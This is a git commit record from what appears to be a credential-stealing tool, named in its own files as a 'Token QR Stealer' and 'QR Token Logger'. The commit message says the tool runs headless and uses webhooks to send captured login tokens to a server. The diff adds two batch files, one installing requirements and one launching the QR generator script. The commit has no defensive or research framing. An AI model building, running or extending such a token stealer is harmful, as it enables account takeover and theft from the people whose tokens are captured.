05f36f0ac431eb9e0425ba0534861bfea791e752
Luci <59532064+9P9@users.noreply.github.com>
2021-05-22 22:17:19 +0100

    Updated From NightFalls QR Token Logger
    Completely Headless - No need to view Chrome Browser In creation of Token Logger
    Uses webhooks to send Token to a server so it is stored and not lost!

---
+++ [1] install_requirements.bat
@@ -0,0 +1,4 @@
+@echo off
+title [313] PIP Install Requirements
+pip install -r requirements.txt
+pause
---
+++ [2] run.bat
@@ -0,0 +1,4 @@
+@echo off
+title [313] Token QR Stealer [Made by NightFall and Revised By Luci] 
+python qr_generator.py
+pause
